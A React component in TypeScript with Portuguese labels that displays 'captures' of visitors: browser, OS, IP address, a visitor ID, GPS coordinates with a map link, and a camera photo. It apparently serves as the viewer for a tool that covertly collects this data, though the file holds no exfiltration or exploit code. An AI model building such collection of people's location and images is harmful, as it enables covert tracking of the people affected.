"use client"

import { useEffect, useState } from "react"
import { CaptureData } from "@/types/telegram"

export function CaptureDataDisplay() {
  const [captures, setCaptures] = useState<CaptureData[]>([])

  useEffect(() => {
    // Load initial data from localStorage
    const loadInitialData = () => {
      try {
        const savedCaptures = localStorage.getItem('captures')
        if (savedCaptures) {
          const parsedCaptures = JSON.parse(savedCaptures)
          setCaptures(parsedCaptures)
        }
      } catch (error) {
        console.error('Error loading initial data:', error)
      }
    }

    // Listen for storage changes
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === 'lastCapture' && e.newValue) {
        try {
          const newCapture = JSON.parse(e.newValue)
          setCaptures([newCapture]) // Replace all captures with the new one
        } catch (error) {
          console.error('Error parsing new capture:', error)
        }
      }
    }

    // Load initial data
    loadInitialData()

    // Add event listener for storage changes
    window.addEventListener('storage', handleStorageChange)

    // Cleanup
    return () => {
      window.removeEventListener('storage', handleStorageChange)
    }
  }, [])

  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 p-4">
      {captures.map((capture, index) => (
        <div key={index} className="bg-white rounded-lg shadow-lg overflow-hidden border-2 border-red-500">
          <div className="bg-red-600 text-white p-3">
            <h3 className="text-lg font-semibold">Captura #{index + 1}</h3>
          </div>
          
          <div className="p-4 space-y-4">
            {/* Device Info */}
            <div className="space-y-2">
              <h4 className="font-semibold text-red-600 border-b border-red-200 pb-1">Informações do Dispositivo</h4>
              <div className="grid grid-cols-2 gap-2 text-sm">
                <div>
                  <span className="font-medium text-gray-600">Navegador:</span>
                  <p className="text-gray-800">{capture.deviceInfo.browser}</p>
                </div>
                <div>
                  <span className="font-medium text-gray-600">Sistema:</span>
                  <p className="text-gray-800">{capture.deviceInfo.os}</p>
                </div>
                <div>
                  <span className="font-medium text-gray-600">IP:</span>
                  <p className="text-gray-800">{capture.deviceInfo.ip}</p>
                </div>
                <div>
                  <span className="font-medium text-gray-600">Horário:</span>
                  <p className="text-gray-800">{new Date(capture.deviceInfo.timestamp).toLocaleString()}</p>
                </div>
                <div className="col-span-2">
                  <span className="font-medium text-gray-600">ID:</span>
                  <p className="text-gray-800">{capture.deviceInfo.visitorId}</p>
                </div>
              </div>
            </div>

            {/* Location */}
            {capture.location.latitude !== 0 && capture.location.longitude !== 0 && (
              <div className="space-y-2">
                <h4 className="font-semibold text-red-600 border-b border-red-200 pb-1">Localização</h4>
                <div className="grid grid-cols-2 gap-2 text-sm">
                  <div>
                    <span className="font-medium text-gray-600">Latitude:</span>
                    <p className="text-gray-800">{capture.location.latitude}</p>
                  </div>
                  <div>
                    <span className="font-medium text-gray-600">Longitude:</span>
                    <p className="text-gray-800">{capture.location.longitude}</p>
                  </div>
                </div>
                <a
                  href={`https://www.google.com/maps?q=${capture.location.latitude},${capture.location.longitude}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-block mt-2 px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700 transition-colors text-sm"
                >
                  Ver no Google Maps
                </a>
              </div>
            )}

            {/* Image */}
            {capture.image && (
              <div className="space-y-2">
                <h4 className="font-semibold text-red-600 border-b border-red-200 pb-1">Foto</h4>
                <div className="relative aspect-video">
                  <img
                    src={capture.image}
                    alt="Captura da câmera"
                    className="w-full h-full object-cover rounded-lg"
                  />
                </div>
              </div>
            )}
          </div>
        </div>
      ))}
    </div>
  )
} 